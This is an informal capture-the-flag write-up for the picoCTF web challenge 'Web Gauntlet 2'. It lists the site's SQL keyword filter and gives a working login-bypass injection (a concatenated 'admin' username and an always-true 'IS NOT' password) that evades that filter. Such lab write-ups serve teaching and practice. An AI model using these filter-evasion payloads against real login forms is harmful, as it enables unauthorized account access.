# CTF-Documentation
# CTF Name : pico ctf
# Category : web exploitation
# Challenge Name : Web Gauntlet 2
# Description 
This website looks familiar...

# Discover
we see login page 
<img width="1599" height="776" alt="1" src="https://github.com/user-attachments/assets/6d396da8-2af1-4b2a-a54d-bd8dd5a7ee56" />

and hint 5 says sql lite must be injection but filter is block us from injection
<img width="1599" height="781" alt="fiilter" src="https://github.com/user-attachments/assets/8564c0c2-0b60-497e-a9de-5a8ac1445de7" />

Filters: or and true false union like = > < ; -- /* */ admin 
# exploit
to baypass filter let's craft payload
username is admin but filter block us so we need to write 
adm'||'in
and password we need to do true value 
a'IS NOT 'b

    username : adm'||'in
    password : a'IS NOT 'b

and after we input payload we get this 
<img width="1599" height="781" alt="2" src="https://github.com/user-attachments/assets/23701ff3-cc0c-49d9-ade9-a1b7a0f2d7b3" />

and to get flag we need to go end point filter.php
<img width="1599" height="780" alt="3" src="https://github.com/user-attachments/assets/7c4a799e-face-4ad7-b31d-13f1c3361211" />

get flag!



